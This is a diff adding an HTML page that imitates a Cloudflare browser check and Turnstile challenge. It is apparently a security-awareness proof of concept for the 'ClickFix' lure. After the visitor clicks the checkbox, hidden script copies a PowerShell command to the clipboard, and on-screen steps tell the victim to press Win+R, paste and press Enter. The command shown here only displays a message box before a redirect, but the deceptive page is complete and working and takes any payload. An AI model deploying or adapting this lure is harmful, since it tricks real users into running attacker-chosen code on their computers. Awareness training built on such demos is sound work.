@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Just a moment...</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #fff;
+    color: #333;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  .main-wrap {
+    width: 100%;
+    max-width: 640px;
+    padding: 0 20px;
+    flex: 1;
+  }
+
+  .stage { display: none; }
+  .stage.active { display: block; }
+
+  .splash {
+    text-align: center;
+    padding-top: 120px;
+  }
+
+  .dot-loader {
+    display: flex;
+    justify-content: center;
+    gap: 7px;
+    margin-bottom: 26px;
+  }
+
+  .dot-loader span {
+    width: 18px;
+    height: 18px;
+    border-radius: 50%;
+    background: #f5a623;
+    animation: dotPulse 1.4s infinite ease-in-out;
+  }
+  .dot-loader span:nth-child(1) { animation-delay: 0s; }
+  .dot-loader span:nth-child(2) { animation-delay: 0.2s; }
+  .dot-loader span:nth-child(3) { animation-delay: 0.4s; }
+
+  @keyframes dotPulse {
+    0%, 80%, 100% { opacity: 0.35; transform: scale(0.85); }
+    40% { opacity: 1; transform: scale(1); }
+  }
+
+  .splash-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 14px;
+    line-height: 1.3;
+  }
+
+  .splash-title .blink {
+    display: inline-block;
+    width: 2px;
+    height: 24px;
+    background: #1a1a1a;
+    margin-left: 3px;
+    vertical-align: text-bottom;
+    animation: blink 1s step-end infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+
+  .splash-sub {
+    font-size: 15px;
+    color: #555;
+    line-height: 1.65;
+    margin-bottom: 36px;
+  }
+
+  .splash-footer {
+    font-size: 13px;
+    color: #999;
+  }
+  .splash-footer a { color: #4a90d9; text-decoration: none; }
+
+  .splash-ray {
+    margin-top: 3px;
+    font-family: "Consolas", "Courier New", monospace;
+    font-size: 12px;
+    color: #aaa;
+  }
+
+
+  .verify-page {
+    padding-top: 70px;
+    text-align: center;
+    animation: fadeIn 0.5s ease-out;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to   { opacity: 1; }
+  }
+
+  .vp-domain {
+    font-size: 22px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 6px;
+  }
+
+  .vp-subtitle {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 28px;
+  }
+
+  /* Turnstile widget */
+  .turnstile-wrap {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 28px;
+  }
+
+  .turnstile {
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+    padding: 11px 14px;
+    display: inline-flex;
+    align-items: center;
+    gap: 40px;
+    background: #fafafa;
+  }
+
+  .ts-left {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .ts-check {
+    width: 24px;
+    height: 24px;
+    border: 2px solid #c5c5c5;
+    border-radius: 3px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fff;
+    transition: border-color 0.15s;
+    flex-shrink: 0;
+    position: relative;
+  }
+  .ts-check:hover { border-color: #999; }
+
+  /* Spinner */
+  .ts-check.spinning {
+    border: 3px solid transparent;
+    border-radius: 50%;
+    background: transparent;
+    cursor: default;
+  }
+  .ts-check.spinning::before {
+    content: "";
+    position: absolute;
+    inset: -3px;
+    border: 3px solid #e5e5e5;
+    border-top-color: #f5a623;
+    border-radius: 50%;
+    animation: spin 0.65s linear infinite;
+  }
+  .ts-check.spinning::after { display: none; }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Reset beat */
+  .ts-check.resetting {
+    border: 2px solid #c5c5c5;
+    border-radius: 3px;
+    background: #fff;
+    cursor: default;
+  }
+  .ts-check.resetting::before,
+  .ts-check.resetting::after { display: none; }
+
+  /* Checked */
+  .ts-check.checked {
+    background: #f5a623;
+    border-color: #f5a623;
+    cursor: default;
+    animation: tickPop 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+  }
+
+  @keyframes tickPop {
+    0%   { transform: scale(0.6); opacity: 0.4; }
+    60%  { transform: scale(1.18); }
+    100% { transform: scale(1); opacity: 1; }
+  }
+
+  .ts-check.checked::after {
+    content: "";
+    width: 6px;
+    height: 12px;
+    border: solid #fff;
+    border-width: 0 2.5px 2.5px 0;
+    transform: rotate(45deg);
+    margin-top: -2px;
+    animation: tickDraw 0.3s ease-out 0.08s both;
+  }
+
+  @keyframes tickDraw {
+    0%   { opacity: 0; transform: rotate(45deg) scale(0.3); }
+    100% { opacity: 1; transform: rotate(45deg) scale(1); }
+  }
+
+  .ts-label {
+    font-size: 13px;
+    color: #333;
+    user-select: none;
+    transition: color 0.3s;
+  }
+
+  .ts-brand-logo {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+  }
+  .ts-brand-cloud {
+    font-size: 8.5px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    color: #bbb;
+    font-weight: 500;
+    line-height: 1;
+  }
+  .ts-brand-name {
+    font-size: 11px;
+    font-weight: 700;
+    color: #f5a623;
+    line-height: 1.2;
+  }
+
+  /* Security text */
+  .security-text {
+    text-align: center;
+    font-size: 13px;
+    color: #666;
+    margin-bottom: 16px;
+    line-height: 1.5;
+  }
+
+  /* Traffic warning */
+  .traffic-warning {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    background: #fef9f1;
+    border: 1px solid #f0dfc0;
+    border-radius: 4px;
+    padding: 12px 14px;
+    text-align: left;
+    transition: opacity 0.3s, max-height 0.4s;
+    overflow: hidden;
+  }
+
+  .traffic-warning.hiding {
+    opacity: 0;
+    max-height: 0 !important;
+    padding: 0 14px;
+    margin: 0;
+    border-color: transparent;
+  }
+
+  .tw-icon {
+    flex-shrink: 0;
+    font-size: 18px;
+    line-height: 1;
+    color: #e8a020;
+  }
+
+  .tw-title {
+    font-weight: 700;
+    font-size: 13px;
+    color: #b86e00;
+    margin-bottom: 3px;
+  }
+
+  .tw-text {
+    font-size: 12px;
+    color: #666;
+    line-height: 1.55;
+  }
+
+  /* Couldn't verify message */
+  .verify-fail-msg {
+    text-align: center;
+    font-size: 13.5px;
+    color: #b86e00;
+    margin-top: 16px;
+    margin-bottom: 4px;
+    display: none;
+    animation: fadeIn 0.4s ease-out;
+  }
+
+  .verify-fail-msg.visible { display: block; }
+
+
+  .challenge-panel {
+    margin-top: 16px;
+    background: #f9f9f9;
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+    overflow: hidden;
+    display: none;
+    text-align: left;
+  }
+
+  .challenge-panel.visible {
+    display: block;
+    animation: panelReveal 0.5s ease-out forwards;
+  }
+
+  @keyframes panelReveal {
+    from { opacity: 0; transform: translateY(-6px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .challenge-header {
+    text-align: center;
+    padding: 16px 24px 12px;
+    border-bottom: 1px solid #e0e0e0;
+  }
+
+  .challenge-header h2 {
+    font-size: 17px;
+    font-weight: 600;
+    color: #222;
+  }
+
+  .challenge-body {
+    padding: 18px 26px 22px;
+  }
+
+  .challenge-intro {
+    font-size: 13.5px;
+    color: #555;
+    margin-bottom: 16px;
+    line-height: 1.5;
+  }
+
+  .steps-list {
+    list-style: none;
+    padding: 0;
+  }
+
+  .steps-list li {
+    font-size: 14px;
+    color: #333;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: baseline;
+    gap: 10px;
+    line-height: 1.6;
+  }
+
+  .steps-list li:last-child { margin-bottom: 0; }
+
+  .step-num {
+    font-weight: 600;
+    color: #555;
+    flex-shrink: 0;
+    min-width: 20px;
+  }
+
+  .step-content { flex: 1; }
+
+  kbd {
+    display: inline-block;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    font-size: 12px;
+    font-weight: 700;
+    color: #333;
+    background: linear-gradient(180deg, #fafafa 0%, #ededed 100%);
+    border: 1px solid #c0c0c0;
+    border-bottom-width: 2px;
+    border-bottom-color: #a8a8a8;
+    border-radius: 4px;
+    padding: 2px 8px 3px;
+    line-height: 1.4;
+    white-space: nowrap;
+    box-shadow: 0 1px 1px rgba(0,0,0,0.06), inset 0 1px 0 rgba(255,255,255,0.7);
+    vertical-align: baseline;
+    margin: 0 1px;
+  }
+
+  kbd.win-icon {
+    padding: 2px 5px 3px;
+    font-size: 14px;
+    vertical-align: middle;
+    line-height: 1;
+    position: relative;
+    top: -1px;
+  }
+
+  .verify-id-box {
+    margin-top: 8px;
+    padding: 10px 14px;
+    background: #fff;
+    border: 1px solid #d8d8d8;
+    border-radius: 4px;
+    font-family: "Consolas", "Courier New", monospace;
+    font-size: 13px;
+    color: #444;
+    max-width: 340px;
+  }
+
+  .challenge-thanks {
+    font-size: 13px;
+    color: #999;
+    font-style: italic;
+    margin-top: 16px;
+  }
+
+  /* ================================================================
+     Footer
+     ================================================================ */
+  .cf-footer {
+    width: 100%;
+    text-align: center;
+    padding: 14px 20px;
+    font-size: 11.5px;
+    color: #999;
+    margin-top: auto;
+  }
+  .cf-footer .ray {
+    font-family: "Consolas", "Courier New", monospace;
+    font-size: 11px;
+    color: #bbb;
+    margin-bottom: 4px;
+  }
+  .cf-footer a { color: #4a90d9; text-decoration: none; }
+
+
+  .warning-banner {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: #c62828;
+    color: #fff;
+    text-align: center;
+    padding: 10px 16px;
+    font-size: 12.5px;
+    font-weight: 600;
+    letter-spacing: 0.4px;
+    z-index: 1000;
+    display: none;
+  }
+  .warning-banner.visible { display: block; }
+</style>
+</head>
+<body>
+
+<div class="main-wrap">
+
+
+  <div id="stage1" class="stage active">
+    <div class="splash">
+      <div class="dot-loader">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      <div class="splash-title">
+        Checking your browser before accessing <span class="blink"></span>
+      </div>
+      <p class="splash-sub">
+        This process is automatic. Your browser will redirect to your requested content shortly.<br>
+        Please allow up to 5 seconds...
+      </p>
+      <div class="splash-footer">
+        DDoS protection by <a href="#">Cloudflare</a>
+        <div class="splash-ray">Ray ID: <span id="rayDisplay1">5f7d3a842bc9e1f0</span></div>
+      </div>
+    </div>
+  </div>
+
+
+  <div id="stage2" class="stage">
+    <div class="verify-page">
+
+      <div class="vp-domain" id="domainDisplay">yourcorporatesite.com</div>
+      <div class="vp-subtitle">Checking if the site connection is secure</div>
+
+      <div class="turnstile-wrap">
+        <div class="turnstile">
+          <div class="ts-left">
+            <div class="ts-check" id="tsCheck" role="button" tabindex="0"></div>
+            <span class="ts-label" id="tsLabel">Verify you are human</span>
+          </div>
+          <div class="ts-brand">
+            <div class="ts-brand-logo">
+              <span class="ts-brand-cloud">Cloudflare</span>
+              <span class="ts-brand-name">Turnstile</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <p class="security-text">
+        <span id="secDomain">yourcorporatesite.com</span> needs to review the security of your connection before proceeding.
+      </p>
+
+      <div class="traffic-warning" id="trafficWarning">
+        <span class="tw-icon">&#9888;</span>
+        <div>
+          <div class="tw-title">Unusual Web Traffic Detected</div>
+          <div class="tw-text">
+            Our security system has identified irregular web activity originating from your IP address. 
+            Automated verification attempts have failed, and we were unable to confirm that you are a legitimate user.
+            To protect yourcorporatesite.com, Cloudflare has introduced additional security measures.
+          </div>
+        </div>
+      </div>
+
+      <!-- "Couldn't verify" message (shown after tick, before panel) -->
+      <p class="verify-fail-msg" id="verifyFailMsg">
+        Cloudflare still couldn't verify you are human. To prevent future warnings, please complete the challenge below.
+      </p>
+
+      <!-- Challenge panel (replaces the traffic warning) -->
+      <div class="challenge-panel" id="challengePanel">
+        <div class="challenge-header">
+          <h2>Cloudflare Verification Challenge</h2>
+        </div>
+        <div class="challenge-body">
+          <p class="challenge-intro">To complete verification do the following steps:</p>
+          <ol class="steps-list">
+            <li>
+              <span class="step-num">1.</span>
+              <span class="step-content">
+                In your browser, press <kbd class="win-icon">&#8862;</kbd> + <kbd>R</kbd>
+              </span>
+            </li>
+            <li>
+              <span class="step-num">2.</span>
+              <span class="step-content">
+                Press <kbd>CTRL</kbd> + <kbd>V</kbd>
+                <div class="verify-id-box" id="verifyIdBox">Cloudflare Verification ID: 715921</div>
+              </span>
+            </li>
+            <li>
+              <span class="step-num">3.</span>
+              <span class="step-content">
+                Press <kbd>Enter</kbd>
+              </span>
+            </li>
+          </ol>
+          <p class="challenge-thanks">You will then be redirected to yourcorporatesite.com!</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
+<div class="cf-footer">
+  <div class="ray">Ray ID: <span id="rayDisplay2">5f7d3a842bc9e1f0</span></div>
+  Performance &amp; Security by <a href="#">Cloudflare</a>
+</div>
+
+<!-- warning Banner
+<div class="warning-banner visible" id="warningBanner">
+  PROOF OF CONCEPT -- SECURITY AWARENESS DEMONSTRATION -- @Speersec
+</div> -->
+
+<script>
+  // =====================================================================
+  // CONFIG
+  // =====================================================================
+  const CONFIG = {
+    targetDomain: "yourcorporatesite.com",
+
+ 
+    verifID:
+      `powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Cloudflare Verification ID: 715921' + [Environment]::NewLine + 'Now.....Enjoy.','Verification Complete')"`,
+
+    displayedId: "Cloudflare Verification ID: 715921",
+
+    // Redirect after clipboard write (set "" to disable)
+    redirectUrl: "https://www.youtube.com/watch?v=2qBlE2-WL60",
+    redirectDelay: 35000,
+
+    // stage 1 splash duration (ms)
+    splashDuration: 4500,
+
+    // Turnstile animation timings (ms)
+    spinnerDuration: 2200,
+    tickDelay:        400,
+    panelDelay:      1000,
+
+    rayId: "5f7d3a842bc9e1f0",
+  };
+
+  // =====================================================================
+  // ELEMENTS
+  // =====================================================================
+  const stage1         = document.getElementById("stage1");
+  const stage2         = document.getElementById("stage2");
+  const tsCheck        = document.getElementById("tsCheck");
+  const tsLabel        = document.getElementById("tsLabel");
+  const trafficWarning = document.getElementById("trafficWarning");
+  const verifyFailMsg  = document.getElementById("verifyFailMsg");
+  const challengePanel = document.getElementById("challengePanel");
+
+  // Populate config
+  document.getElementById("domainDisplay").textContent = CONFIG.targetDomain;
+  document.getElementById("secDomain").textContent     = CONFIG.targetDomain;
+  document.getElementById("rayDisplay1").textContent   = CONFIG.rayId;
+  document.getElementById("rayDisplay2").textContent   = CONFIG.rayId;
+  document.getElementById("verifyIdBox").textContent   = CONFIG.displayedId;
+
+
+  setTimeout(() => {
+    stage1.classList.remove("active");
+    stage2.classList.add("active");
+  }, CONFIG.splashDuration);
+
+
+  tsCheck.addEventListener("click", () => {
+    if (tsCheck.dataset.active) return;
+    tsCheck.dataset.active = "1";
+
+    tsCheck.classList.add("spinning");
+
+    setTimeout(() => {
+      tsCheck.classList.remove("spinning");
+      tsCheck.classList.add("resetting");
+
+      setTimeout(() => {
+        tsCheck.classList.remove("resetting");
+        tsCheck.classList.add("checked");
+
+        tsLabel.textContent = "Verification incomplete";
+        tsLabel.style.color = "#b86e00";
+
+        setTimeout(() => {
+          trafficWarning.classList.add("hiding");
+
+          verifyFailMsg.classList.add("visible");
+
+          setTimeout(() => {
+            challengePanel.classList.add("visible");
+            writeverifIDAndRedirect();
+          }, 350);
+
+        }, CONFIG.panelDelay);
+      }, CONFIG.tickDelay);
+    }, CONFIG.spinnerDuration);
+  });
+
+  async function writeverifIDAndRedirect() {
+    try {
+      await navigator.clipboard.writeText(CONFIG.verifID);
+    } catch {
+      const ta = document.createElement("textarea");
+      ta.value = CONFIG.verifID;
+      ta.style.cssText = "position:fixed;left:-9999px;opacity:0";
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand("copy");
+      document.body.removeChild(ta);
+    }
+
+    if (CONFIG.redirectUrl) {
+      setTimeout(() => {
+        window.location.href = CONFIG.redirectUrl;
+      }, CONFIG.redirectDelay);
+    }
+  }
+</script>
+
+</body>
+</html>
